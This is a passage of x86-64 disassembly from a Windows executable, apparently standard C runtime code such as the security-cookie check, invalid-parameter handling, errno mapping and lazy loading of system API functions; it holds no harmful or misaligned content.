   140005638:	48 83 ec 28          	sub    $0x28,%rsp
   14000563c:	8b 0d 0e 1a 01 00    	mov    0x11a0e(%rip),%ecx        # 0x140017050
   140005642:	83 f9 ff             	cmp    $0xffffffff,%ecx
   140005645:	74 0c                	je     0x140005653
   140005647:	e8 10 06 00 00       	call   0x140005c5c
   14000564c:	83 0d fd 19 01 00 ff 	orl    $0xffffffff,0x119fd(%rip)        # 0x140017050
   140005653:	b0 01                	mov    $0x1,%al
   140005655:	48 83 c4 28          	add    $0x28,%rsp
   140005659:	c3                   	ret
   14000565a:	cc                   	int3
   14000565b:	cc                   	int3
   14000565c:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140005661:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140005666:	55                   	push   %rbp
   140005667:	57                   	push   %rdi
   140005668:	41 56                	push   %r14
   14000566a:	48 8d ac 24 10 fb ff 	lea    -0x4f0(%rsp),%rbp
   140005671:	ff 
   140005672:	48 81 ec f0 05 00 00 	sub    $0x5f0,%rsp
   140005679:	48 8b 05 80 19 01 00 	mov    0x11980(%rip),%rax        # 0x140017000
   140005680:	48 33 c4             	xor    %rsp,%rax
   140005683:	48 89 85 e0 04 00 00 	mov    %rax,0x4e0(%rbp)
   14000568a:	41 8b f8             	mov    %r8d,%edi
   14000568d:	8b f2                	mov    %edx,%esi
   14000568f:	8b d9                	mov    %ecx,%ebx
   140005691:	83 f9 ff             	cmp    $0xffffffff,%ecx
   140005694:	74 05                	je     0x14000569b
   140005696:	e8 69 c9 ff ff       	call   0x140002004
   14000569b:	33 d2                	xor    %edx,%edx
   14000569d:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   1400056a2:	41 b8 98 00 00 00    	mov    $0x98,%r8d
   1400056a8:	e8 73 d2 ff ff       	call   0x140002920
   1400056ad:	33 d2                	xor    %edx,%edx
   1400056af:	48 8d 4d 10          	lea    0x10(%rbp),%rcx
   1400056b3:	41 b8 d0 04 00 00    	mov    $0x4d0,%r8d
   1400056b9:	e8 62 d2 ff ff       	call   0x140002920
   1400056be:	48 8d 44 24 70       	lea    0x70(%rsp),%rax
   1400056c3:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   1400056c8:	48 8d 4d 10          	lea    0x10(%rbp),%rcx
   1400056cc:	48 8d 45 10          	lea    0x10(%rbp),%rax
   1400056d0:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   1400056d5:	ff 15 f5 79 00 00    	call   *0x79f5(%rip)        # 0x14000d0d0
   1400056db:	4c 8b b5 08 01 00 00 	mov    0x108(%rbp),%r14
   1400056e2:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   1400056e7:	49 8b ce             	mov    %r14,%rcx
   1400056ea:	45 33 c0             	xor    %r8d,%r8d
   1400056ed:	ff 15 e5 79 00 00    	call   *0x79e5(%rip)        # 0x14000d0d8
   1400056f3:	48 85 c0             	test   %rax,%rax
   1400056f6:	74 36                	je     0x14000572e
   1400056f8:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   1400056fe:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   140005703:	48 8b 54 24 40       	mov    0x40(%rsp),%rdx
   140005708:	4c 8b c8             	mov    %rax,%r9
   14000570b:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   140005710:	4d 8b c6             	mov    %r14,%r8
   140005713:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140005718:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   14000571d:	48 8d 4d 10          	lea    0x10(%rbp),%rcx
   140005721:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   140005726:	33 c9                	xor    %ecx,%ecx
   140005728:	ff 15 b2 79 00 00    	call   *0x79b2(%rip)        # 0x14000d0e0
   14000572e:	48 8b 85 08 05 00 00 	mov    0x508(%rbp),%rax
   140005735:	48 89 85 08 01 00 00 	mov    %rax,0x108(%rbp)
   14000573c:	48 8d 85 08 05 00 00 	lea    0x508(%rbp),%rax
   140005743:	48 83 c0 08          	add    $0x8,%rax
   140005747:	89 74 24 70          	mov    %esi,0x70(%rsp)
   14000574b:	48 89 85 a8 00 00 00 	mov    %rax,0xa8(%rbp)
   140005752:	48 8b 85 08 05 00 00 	mov    0x508(%rbp),%rax
   140005759:	48 89 45 80          	mov    %rax,-0x80(%rbp)
   14000575d:	89 7c 24 74          	mov    %edi,0x74(%rsp)
   140005761:	ff 15 b9 79 00 00    	call   *0x79b9(%rip)        # 0x14000d120
   140005767:	33 c9                	xor    %ecx,%ecx
   140005769:	8b f8                	mov    %eax,%edi
   14000576b:	ff 15 7f 79 00 00    	call   *0x797f(%rip)        # 0x14000d0f0
   140005771:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   140005776:	ff 15 6c 79 00 00    	call   *0x796c(%rip)        # 0x14000d0e8
   14000577c:	85 c0                	test   %eax,%eax
   14000577e:	75 10                	jne    0x140005790
   140005780:	85 ff                	test   %edi,%edi
   140005782:	75 0c                	jne    0x140005790
   140005784:	83 fb ff             	cmp    $0xffffffff,%ebx
   140005787:	74 07                	je     0x140005790
   140005789:	8b cb                	mov    %ebx,%ecx
   14000578b:	e8 74 c8 ff ff       	call   0x140002004
   140005790:	48 8b 8d e0 04 00 00 	mov    0x4e0(%rbp),%rcx
   140005797:	48 33 cc             	xor    %rsp,%rcx
   14000579a:	e8 e1 bd ff ff       	call   0x140001580
   14000579f:	4c 8d 9c 24 f0 05 00 	lea    0x5f0(%rsp),%r11
   1400057a6:	00 
   1400057a7:	49 8b 5b 28          	mov    0x28(%r11),%rbx
   1400057ab:	49 8b 73 30          	mov    0x30(%r11),%rsi
   1400057af:	49 8b e3             	mov    %r11,%rsp
   1400057b2:	41 5e                	pop    %r14
   1400057b4:	5f                   	pop    %rdi
   1400057b5:	5d                   	pop    %rbp
   1400057b6:	c3                   	ret
   1400057b7:	cc                   	int3
   1400057b8:	48 89 0d b9 2b 01 00 	mov    %rcx,0x12bb9(%rip)        # 0x140018378
   1400057bf:	c3                   	ret
   1400057c0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400057c5:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   1400057ca:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400057cf:	57                   	push   %rdi
   1400057d0:	48 83 ec 30          	sub    $0x30,%rsp
   1400057d4:	41 8b d9             	mov    %r9d,%ebx
   1400057d7:	49 8b f8             	mov    %r8,%rdi
   1400057da:	48 8b f2             	mov    %rdx,%rsi
   1400057dd:	48 8b e9             	mov    %rcx,%rbp
   1400057e0:	e8 4b fd ff ff       	call   0x140005530
   1400057e5:	48 85 c0             	test   %rax,%rax
   1400057e8:	74 3d                	je     0x140005827
   1400057ea:	48 8b 80 b8 03 00 00 	mov    0x3b8(%rax),%rax
   1400057f1:	48 85 c0             	test   %rax,%rax
   1400057f4:	74 31                	je     0x140005827
   1400057f6:	48 8b 54 24 60       	mov    0x60(%rsp),%rdx
   1400057fb:	44 8b cb             	mov    %ebx,%r9d
   1400057fe:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   140005803:	4c 8b c7             	mov    %rdi,%r8
   140005806:	48 8b d6             	mov    %rsi,%rdx
   140005809:	48 8b cd             	mov    %rbp,%rcx
   14000580c:	ff 15 76 7a 00 00    	call   *0x7a76(%rip)        # 0x14000d288
   140005812:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140005817:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   14000581c:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   140005821:	48 83 c4 30          	add    $0x30,%rsp
   140005825:	5f                   	pop    %rdi
   140005826:	c3                   	ret
   140005827:	4c 8b 15 d2 17 01 00 	mov    0x117d2(%rip),%r10        # 0x140017000
   14000582e:	44 8b cb             	mov    %ebx,%r9d
   140005831:	41 8b ca             	mov    %r10d,%ecx
   140005834:	4c 8b c7             	mov    %rdi,%r8
   140005837:	4c 33 15 3a 2b 01 00 	xor    0x12b3a(%rip),%r10        # 0x140018378
   14000583e:	83 e1 3f             	and    $0x3f,%ecx
   140005841:	49 d3 ca             	ror    %cl,%r10
   140005844:	48 8b d6             	mov    %rsi,%rdx
   140005847:	4d 85 d2             	test   %r10,%r10
   14000584a:	74 0f                	je     0x14000585b
   14000584c:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   140005851:	49 8b c2             	mov    %r10,%rax
   140005854:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   140005859:	eb ae                	jmp    0x140005809
   14000585b:	48 8b 44 24 60       	mov    0x60(%rsp),%rax
   140005860:	48 8b cd             	mov    %rbp,%rcx
   140005863:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140005868:	e8 23 00 00 00       	call   0x140005890
   14000586d:	cc                   	int3
   14000586e:	cc                   	int3
   14000586f:	cc                   	int3
   140005870:	48 83 ec 38          	sub    $0x38,%rsp
   140005874:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   14000587a:	45 33 c9             	xor    %r9d,%r9d
   14000587d:	45 33 c0             	xor    %r8d,%r8d
   140005880:	33 d2                	xor    %edx,%edx
   140005882:	33 c9                	xor    %ecx,%ecx
   140005884:	e8 37 ff ff ff       	call   0x1400057c0
   140005889:	48 83 c4 38          	add    $0x38,%rsp
   14000588d:	c3                   	ret
   14000588e:	cc                   	int3
   14000588f:	cc                   	int3
   140005890:	48 83 ec 28          	sub    $0x28,%rsp
   140005894:	b9 17 00 00 00       	mov    $0x17,%ecx
   140005899:	ff 15 59 78 00 00    	call   *0x7859(%rip)        # 0x14000d0f8
   14000589f:	85 c0                	test   %eax,%eax
   1400058a1:	74 07                	je     0x1400058aa
   1400058a3:	b9 05 00 00 00       	mov    $0x5,%ecx
   1400058a8:	cd 29                	int    $0x29
   1400058aa:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   1400058b0:	ba 17 04 00 c0       	mov    $0xc0000417,%edx
   1400058b5:	41 8d 48 01          	lea    0x1(%r8),%ecx
   1400058b9:	e8 9e fd ff ff       	call   0x14000565c
   1400058be:	ff 15 bc 77 00 00    	call   *0x77bc(%rip)        # 0x14000d080
   1400058c4:	48 8b c8             	mov    %rax,%rcx
   1400058c7:	ba 17 04 00 c0       	mov    $0xc0000417,%edx
   1400058cc:	48 83 c4 28          	add    $0x28,%rsp
   1400058d0:	48 ff 25 99 77 00 00 	rex.W jmp *0x7799(%rip)        # 0x14000d070
   1400058d7:	cc                   	int3
   1400058d8:	33 c0                	xor    %eax,%eax
   1400058da:	4c 8d 0d 5f 8c 00 00 	lea    0x8c5f(%rip),%r9        # 0x14000e540
   1400058e1:	49 8b d1             	mov    %r9,%rdx
   1400058e4:	44 8d 40 08          	lea    0x8(%rax),%r8d
   1400058e8:	3b 0a                	cmp    (%rdx),%ecx
   1400058ea:	74 2b                	je     0x140005917
   1400058ec:	ff c0                	inc    %eax
   1400058ee:	49 03 d0             	add    %r8,%rdx
   1400058f1:	83 f8 2d             	cmp    $0x2d,%eax
   1400058f4:	72 f2                	jb     0x1400058e8
   1400058f6:	8d 41 ed             	lea    -0x13(%rcx),%eax
   1400058f9:	83 f8 11             	cmp    $0x11,%eax
   1400058fc:	77 06                	ja     0x140005904
   1400058fe:	b8 0d 00 00 00       	mov    $0xd,%eax
   140005903:	c3                   	ret
   140005904:	81 c1 44 ff ff ff    	add    $0xffffff44,%ecx
   14000590a:	b8 16 00 00 00       	mov    $0x16,%eax
   14000590f:	83 f9 0e             	cmp    $0xe,%ecx
   140005912:	41 0f 46 c0          	cmovbe %r8d,%eax
   140005916:	c3                   	ret
   140005917:	41 8b 44 c1 04       	mov    0x4(%r9,%rax,8),%eax
   14000591c:	c3                   	ret
   14000591d:	cc                   	int3
   14000591e:	cc                   	int3
   14000591f:	cc                   	int3
   140005920:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005925:	57                   	push   %rdi
   140005926:	48 83 ec 20          	sub    $0x20,%rsp
   14000592a:	8b f9                	mov    %ecx,%edi
   14000592c:	e8 ff fb ff ff       	call   0x140005530
   140005931:	48 85 c0             	test   %rax,%rax
   140005934:	75 09                	jne    0x14000593f
   140005936:	48 8d 05 1b 17 01 00 	lea    0x1171b(%rip),%rax        # 0x140017058
   14000593d:	eb 04                	jmp    0x140005943
   14000593f:	48 83 c0 24          	add    $0x24,%rax
   140005943:	89 38                	mov    %edi,(%rax)
   140005945:	e8 e6 fb ff ff       	call   0x140005530
   14000594a:	48 8d 1d 03 17 01 00 	lea    0x11703(%rip),%rbx        # 0x140017054
   140005951:	48 85 c0             	test   %rax,%rax
   140005954:	74 04                	je     0x14000595a
   140005956:	48 8d 58 20          	lea    0x20(%rax),%rbx
   14000595a:	8b cf                	mov    %edi,%ecx
   14000595c:	e8 77 ff ff ff       	call   0x1400058d8
   140005961:	89 03                	mov    %eax,(%rbx)
   140005963:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140005968:	48 83 c4 20          	add    $0x20,%rsp
   14000596c:	5f                   	pop    %rdi
   14000596d:	c3                   	ret
   14000596e:	cc                   	int3
   14000596f:	cc                   	int3
   140005970:	48 83 ec 28          	sub    $0x28,%rsp
   140005974:	e8 b7 fb ff ff       	call   0x140005530
   140005979:	48 85 c0             	test   %rax,%rax
   14000597c:	75 09                	jne    0x140005987
   14000597e:	48 8d 05 d3 16 01 00 	lea    0x116d3(%rip),%rax        # 0x140017058
   140005985:	eb 04                	jmp    0x14000598b
   140005987:	48 83 c0 24          	add    $0x24,%rax
   14000598b:	48 83 c4 28          	add    $0x28,%rsp
   14000598f:	c3                   	ret
   140005990:	48 83 ec 28          	sub    $0x28,%rsp
   140005994:	e8 97 fb ff ff       	call   0x140005530
   140005999:	48 85 c0             	test   %rax,%rax
   14000599c:	75 09                	jne    0x1400059a7
   14000599e:	48 8d 05 af 16 01 00 	lea    0x116af(%rip),%rax        # 0x140017054
   1400059a5:	eb 04                	jmp    0x1400059ab
   1400059a7:	48 83 c0 20          	add    $0x20,%rax
   1400059ab:	48 83 c4 28          	add    $0x28,%rsp
   1400059af:	c3                   	ret
   1400059b0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400059b5:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   1400059ba:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400059bf:	57                   	push   %rdi
   1400059c0:	41 54                	push   %r12
   1400059c2:	41 55                	push   %r13
   1400059c4:	41 56                	push   %r14
   1400059c6:	41 57                	push   %r15
   1400059c8:	48 83 ec 20          	sub    $0x20,%rsp
   1400059cc:	44 8b f9             	mov    %ecx,%r15d
   1400059cf:	4c 8d 35 2a a6 ff ff 	lea    -0x59d6(%rip),%r14        # 0x140000000
   1400059d6:	4d 8b e1             	mov    %r9,%r12
   1400059d9:	49 8b e8             	mov    %r8,%rbp
   1400059dc:	4c 8b ea             	mov    %rdx,%r13
   1400059df:	4b 8b 8c fe 20 84 01 	mov    0x18420(%r14,%r15,8),%rcx
   1400059e6:	00 
   1400059e7:	4c 8b 15 12 16 01 00 	mov    0x11612(%rip),%r10        # 0x140017000
   1400059ee:	48 83 cf ff          	or     $0xffffffffffffffff,%rdi
   1400059f2:	41 8b c2             	mov    %r10d,%eax
   1400059f5:	49 8b d2             	mov    %r10,%rdx
   1400059f8:	48 33 d1             	xor    %rcx,%rdx
   1400059fb:	83 e0 3f             	and    $0x3f,%eax
   1400059fe:	8a c8                	mov    %al,%cl
   140005a00:	48 d3 ca             	ror    %cl,%rdx
   140005a03:	48 3b d7             	cmp    %rdi,%rdx
   140005a06:	0f 84 5b 01 00 00    	je     0x140005b67
   140005a0c:	48 85 d2             	test   %rdx,%rdx
   140005a0f:	74 08                	je     0x140005a19
   140005a11:	48 8b c2             	mov    %rdx,%rax
   140005a14:	e9 50 01 00 00       	jmp    0x140005b69
   140005a19:	4d 3b c4             	cmp    %r12,%r8
   140005a1c:	0f 84 d9 00 00 00    	je     0x140005afb
   140005a22:	8b 75 00             	mov    0x0(%rbp),%esi
   140005a25:	49 8b 9c f6 80 83 01 	mov    0x18380(%r14,%rsi,8),%rbx
   140005a2c:	00 
   140005a2d:	48 85 db             	test   %rbx,%rbx
   140005a30:	74 0e                	je     0x140005a40
   140005a32:	48 3b df             	cmp    %rdi,%rbx
   140005a35:	0f 84 ac 00 00 00    	je     0x140005ae7
   140005a3b:	e9 a2 00 00 00       	jmp    0x140005ae2
   140005a40:	4d 8b b4 f6 b0 e6 00 	mov    0xe6b0(%r14,%rsi,8),%r14
   140005a47:	00 
   140005a48:	33 d2                	xor    %edx,%edx
   140005a4a:	49 8b ce             	mov    %r14,%rcx
   140005a4d:	41 b8 00 08 00 00    	mov    $0x800,%r8d
   140005a53:	ff 15 37 77 00 00    	call   *0x7737(%rip)        # 0x14000d190
   140005a59:	48 8b d8             	mov    %rax,%rbx
   140005a5c:	48 85 c0             	test   %rax,%rax
   140005a5f:	75 4f                	jne    0x140005ab0
   140005a61:	ff 15 b1 75 00 00    	call   *0x75b1(%rip)        # 0x14000d018
   140005a67:	83 f8 57             	cmp    $0x57,%eax
   140005a6a:	75 42                	jne    0x140005aae
   140005a6c:	8d 58 b0             	lea    -0x50(%rax),%ebx
   140005a6f:	49 8b ce             	mov    %r14,%rcx
   140005a72:	44 8b c3             	mov    %ebx,%r8d
   140005a75:	48 8d 15 2c 88 00 00 	lea    0x882c(%rip),%rdx        # 0x14000e2a8
   140005a7c:	e8 8f f5 ff ff       	call   0x140005010
   140005a81:	85 c0                	test   %eax,%eax
   140005a83:	74 29                	je     0x140005aae
   140005a85:	44 8b c3             	mov    %ebx,%r8d
   140005a88:	48 8d 15 19 91 00 00 	lea    0x9119(%rip),%rdx        # 0x14000eba8
   140005a8f:	49 8b ce             	mov    %r14,%rcx
   140005a92:	e8 79 f5 ff ff       	call   0x140005010
   140005a97:	85 c0                	test   %eax,%eax
   140005a99:	74 13                	je     0x140005aae
   140005a9b:	45 33 c0             	xor    %r8d,%r8d
   140005a9e:	33 d2                	xor    %edx,%edx
   140005aa0:	49 8b ce             	mov    %r14,%rcx
   140005aa3:	ff 15 e7 76 00 00    	call   *0x76e7(%rip)        # 0x14000d190
   140005aa9:	48 8b d8             	mov    %rax,%rbx
   140005aac:	eb 02                	jmp    0x140005ab0
   140005aae:	33 db                	xor    %ebx,%ebx
   140005ab0:	4c 8d 35 49 a5 ff ff 	lea    -0x5ab7(%rip),%r14        # 0x140000000
   140005ab7:	48 85 db             	test   %rbx,%rbx
   140005aba:	75 0d                	jne    0x140005ac9
   140005abc:	48 8b c7             	mov    %rdi,%rax
   140005abf:	49 87 84 f6 80 83 01 	xchg   %rax,0x18380(%r14,%rsi,8)
   140005ac6:	00 
   140005ac7:	eb 1e                	jmp    0x140005ae7
   140005ac9:	48 8b c3             	mov    %rbx,%rax
   140005acc:	49 87 84 f6 80 83 01 	xchg   %rax,0x18380(%r14,%rsi,8)
   140005ad3:	00 
   140005ad4:	48 85 c0             	test   %rax,%rax
   140005ad7:	74 09                	je     0x140005ae2
   140005ad9:	48 8b cb             	mov    %rbx,%rcx
   140005adc:	ff 15 66 75 00 00    	call   *0x7566(%rip)        # 0x14000d048
   140005ae2:	48 85 db             	test   %rbx,%rbx
   140005ae5:	75 55                	jne    0x140005b3c
   140005ae7:	48 83 c5 04          	add    $0x4,%rbp
   140005aeb:	49 3b ec             	cmp    %r12,%rbp
   140005aee:	0f 85 2e ff ff ff    	jne    0x140005a22
   140005af4:	4c 8b 15 05 15 01 00 	mov    0x11505(%rip),%r10        # 0x140017000
   140005afb:	33 db                	xor    %ebx,%ebx
   140005afd:	48 85 db             	test   %rbx,%rbx
   140005b00:	74 4a                	je     0x140005b4c
   140005b02:	49 8b d5             	mov    %r13,%rdx
   140005b05:	48 8b cb             	mov    %rbx,%rcx
   140005b08:	ff 15 2a 75 00 00    	call   *0x752a(%rip)        # 0x14000d038
   140005b0e:	48 85 c0             	test   %rax,%rax
   140005b11:	74 32                	je     0x140005b45
   140005b13:	4c 8b 05 e6 14 01 00 	mov    0x114e6(%rip),%r8        # 0x140017000
   140005b1a:	ba 40 00 00 00       	mov    $0x40,%edx
   140005b1f:	41 8b c8             	mov    %r8d,%ecx
   140005b22:	83 e1 3f             	and    $0x3f,%ecx
   140005b25:	2b d1                	sub    %ecx,%edx
   140005b27:	8a ca                	mov    %dl,%cl
   140005b29:	48 8b d0             	mov    %rax,%rdx
   140005b2c:	48 d3 ca             	ror    %cl,%rdx
   140005b2f:	49 33 d0             	xor    %r8,%rdx
   140005b32:	4b 87 94 fe 20 84 01 	xchg   %rdx,0x18420(%r14,%r15,8)
   140005b39:	00 
   140005b3a:	eb 2d                	jmp    0x140005b69
   140005b3c:	4c 8b 15 bd 14 01 00 	mov    0x114bd(%rip),%r10        # 0x140017000
   140005b43:	eb b8                	jmp    0x140005afd
   140005b45:	4c 8b 15 b4 14 01 00 	mov    0x114b4(%rip),%r10        # 0x140017000
   140005b4c:	41 8b c2             	mov    %r10d,%eax
   140005b4f:	b9 40 00 00 00       	mov    $0x40,%ecx
   140005b54:	83 e0 3f             	and    $0x3f,%eax
   140005b57:	2b c8                	sub    %eax,%ecx
   140005b59:	48 d3 cf             	ror    %cl,%rdi
   140005b5c:	49 33 fa             	xor    %r10,%rdi
   140005b5f:	4b 87 bc fe 20 84 01 	xchg   %rdi,0x18420(%r14,%r15,8)
   140005b66:	00 
   140005b67:	33 c0                	xor    %eax,%eax
   140005b69:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   140005b6e:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   140005b73:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   140005b78:	48 83 c4 20          	add    $0x20,%rsp
   140005b7c:	41 5f                	pop    %r15
   140005b7e:	41 5e                	pop    %r14
   140005b80:	41 5d                	pop    %r13
   140005b82:	41 5c                	pop    %r12
   140005b84:	5f                   	pop    %rdi
   140005b85:	c3                   	ret
   140005b86:	cc                   	int3
   140005b87:	cc                   	int3
   140005b88:	40 53                	rex push %rbx
   140005b8a:	48 83 ec 20          	sub    $0x20,%rsp
   140005b8e:	48 8b d9             	mov    %rcx,%rbx
   140005b91:	4c 8d 0d 98 90 00 00 	lea    0x9098(%rip),%r9        # 0x14000ec30
   140005b98:	b9 1c 00 00 00       	mov    $0x1c,%ecx
   140005b9d:	4c 8d 05 88 90 00 00 	lea    0x9088(%rip),%r8        # 0x14000ec2c
   140005ba4:	48 8d 15 85 90 00 00 	lea    0x9085(%rip),%rdx        # 0x14000ec30
   140005bab:	e8 00 fe ff ff       	call   0x1400059b0
   140005bb0:	48 85 c0             	test   %rax,%rax
   140005bb3:	74 16                	je     0x140005bcb
   140005bb5:	48 8b d3             	mov    %rbx,%rdx
   140005bb8:	48 c7 c1 fa ff ff ff 	mov    $0xfffffffffffffffa,%rcx
   140005bbf:	48 83 c4 20          	add    $0x20,%rsp
   140005bc3:	5b                   	pop    %rbx
   140005bc4:	48 ff 25 bd 76 00 00 	rex.W jmp *0x76bd(%rip)        # 0x14000d288
   140005bcb:	b8 25 02 00 c0       	mov    $0xc0000225,%eax
   140005bd0:	48 83 c4 20          	add    $0x20,%rsp
   140005bd4:	5b                   	pop    %rbx
   140005bd5:	c3                   	ret
   140005bd6:	cc                   	int3
   140005bd7:	cc                   	int3
   140005bd8:	48 83 ec 28          	sub    $0x28,%rsp
   140005bdc:	4c 8d 0d d9 8f 00 00 	lea    0x8fd9(%rip),%r9        # 0x14000ebbc
   140005be3:	33 c9                	xor    %ecx,%ecx
   140005be5:	4c 8d 05 cc 8f 00 00 	lea    0x8fcc(%rip),%r8        # 0x14000ebb8
   140005bec:	48 8d 15 cd 8f 00 00 	lea    0x8fcd(%rip),%rdx        # 0x14000ebc0
   140005bf3:	e8 b8 fd ff ff       	call   0x1400059b0
   140005bf8:	48 85 c0             	test   %rax,%rax
   140005bfb:	74 0b                	je     0x140005c08
   140005bfd:	48 83 c4 28          	add    $0x28,%rsp
   140005c01:	48 ff 25 80 76 00 00 	rex.W jmp *0x7680(%rip)        # 0x14000d288
   140005c08:	b8 01 00 00 00       	mov    $0x1,%eax
   140005c0d:	48 83 c4 28          	add    $0x28,%rsp
   140005c11:	c3                   	ret
   140005c12:	cc                   	int3
   140005c13:	cc                   	int3
   140005c14:	40 53                	rex push %rbx
   140005c16:	48 83 ec 20          	sub    $0x20,%rsp
   140005c1a:	48 8b d9             	mov    %rcx,%rbx
   140005c1d:	4c 8d 0d b4 8f 00 00 	lea    0x8fb4(%rip),%r9        # 0x14000ebd8
   140005c24:	b9 03 00 00 00       	mov    $0x3,%ecx
   140005c29:	4c 8d 05 a0 8f 00 00 	lea    0x8fa0(%rip),%r8        # 0x14000ebd0
   140005c30:	48 8d 15 89 86 00 00 	lea    0x8689(%rip),%rdx        # 0x14000e2c0
   140005c37:	e8 74 fd ff ff       	call   0x1400059b0
   140005c3c:	48 85 c0             	test   %rax,%rax
   140005c3f:	74 0f                	je     0x140005c50
   140005c41:	48 8b cb             	mov    %rbx,%rcx
   140005c44:	48 83 c4 20          	add    $0x20,%rsp
   140005c48:	5b                   	pop    %rbx
   140005c49:	48 ff 25 38 76 00 00 	rex.W jmp *0x7638(%rip)        # 0x14000d288
   140005c50:	48 83 c4 20          	add    $0x20,%rsp
   140005c54:	5b                   	pop    %rbx
   140005c55:	48 ff 25 14 75 00 00 	rex.W jmp *0x7514(%rip)        # 0x14000d170
   140005c5c:	40 53                	rex push %rbx
   140005c5e:	48 83 ec 20          	sub    $0x20,%rsp
   140005c62:	8b d9                	mov    %ecx,%ebx
   140005c64:	4c 8d 0d 75 8f 00 00 	lea    0x8f75(%rip),%r9        # 0x14000ebe0
   140005c6b:	b9 04 00 00 00       	mov    $0x4,%ecx
   140005c70:	4c 8d 05 61 8f 00 00 	lea    0x8f61(%rip),%r8        # 0x14000ebd8
   140005c77:	48 8d 15 5a 86 00 00 	lea    0x865a(%rip),%rdx        # 0x14000e2d8
   140005c7e:	e8 2d fd ff ff       	call   0x1400059b0
   140005c83:	8b cb                	mov    %ebx,%ecx
   140005c85:	48 85 c0             	test   %rax,%rax
   140005c88:	74 0c                	je     0x140005c96
   140005c8a:	48 83 c4 20          	add    $0x20,%rsp
   140005c8e:	5b                   	pop    %rbx
   140005c8f:	48 ff 25 f2 75 00 00 	rex.W jmp *0x75f2(%rip)        # 0x14000d288
   140005c96:	48 83 c4 20          	add    $0x20,%rsp
   140005c9a:	5b                   	pop    %rbx
   140005c9b:	48 ff 25 e6 74 00 00 	rex.W jmp *0x74e6(%rip)        # 0x14000d188
   140005ca2:	cc                   	int3
   140005ca3:	cc                   	int3
   140005ca4:	40 53                	rex push %rbx
   140005ca6:	48 83 ec 20          	sub    $0x20,%rsp
   140005caa:	8b d9                	mov    %ecx,%ebx
   140005cac:	4c 8d 0d 35 8f 00 00 	lea    0x8f35(%rip),%r9        # 0x14000ebe8
   140005cb3:	b9 05 00 00 00       	mov    $0x5,%ecx
   140005cb8:	4c 8d 05 21 8f 00 00 	lea    0x8f21(%rip),%r8        # 0x14000ebe0
   140005cbf:	48 8d 15 22 86 00 00 	lea    0x8622(%rip),%rdx        # 0x14000e2e8
   140005cc6:	e8 e5 fc ff ff       	call   0x1400059b0
   140005ccb:	8b cb                	mov    %ebx,%ecx
   140005ccd:	48 85 c0             	test   %rax,%rax
   140005cd0:	74 0c                	je     0x140005cde
   140005cd2:	48 83 c4 20          	add    $0x20,%rsp
   140005cd6:	5b                   	pop    %rbx
   140005cd7:	48 ff 25 aa 75 00 00 	rex.W jmp *0x75aa(%rip)        # 0x14000d288
   140005cde:	48 83 c4 20          	add    $0x20,%rsp
   140005ce2:	5b                   	pop    %rbx
   140005ce3:	48 ff 25 8e 74 00 00 	rex.W jmp *0x748e(%rip)        # 0x14000d178
   140005cea:	cc                   	int3
   140005ceb:	cc                   	int3
   140005cec:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005cf1:	57                   	push   %rdi
   140005cf2:	48 83 ec 20          	sub    $0x20,%rsp
   140005cf6:	48 8b da             	mov    %rdx,%rbx
   140005cf9:	4c 8d 0d f0 8e 00 00 	lea    0x8ef0(%rip),%r9        # 0x14000ebf0
   140005d00:	8b f9                	mov    %ecx,%edi
   140005d02:	48 8d 15 f7 85 00 00 	lea    0x85f7(%rip),%rdx        # 0x14000e300
   140005d09:	b9 06 00 00 00       	mov    $0x6,%ecx
   140005d0e:	4c 8d 05 d3 8e 00 00 	lea    0x8ed3(%rip),%r8        # 0x14000ebe8
   140005d15:	e8 96 fc ff ff       	call   0x1400059b0
   140005d1a:	48 8b d3             	mov    %rbx,%rdx
   140005d1d:	8b cf                	mov    %edi,%ecx
   140005d1f:	48 85 c0             	test   %rax,%rax
   140005d22:	74 08                	je     0x140005d2c
   140005d24:	ff 15 5e 75 00 00    	call   *0x755e(%rip)        # 0x14000d288
   140005d2a:	eb 06                	jmp    0x140005d32
   140005d2c:	ff 15 4e 74 00 00    	call   *0x744e(%rip)        # 0x14000d180
   140005d32:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140005d37:	48 83 c4 20          	add    $0x20,%rsp
   140005d3b:	5f                   	pop    %rdi
   140005d3c:	c3                   	ret
   140005d3d:	cc                   	int3
   140005d3e:	cc                   	int3
   140005d3f:	cc                   	int3
   140005d40:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005d45:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140005d4a:	57                   	push   %rdi
   140005d4b:	48 83 ec 20          	sub    $0x20,%rsp
   140005d4f:	41 8b f0             	mov    %r8d,%esi
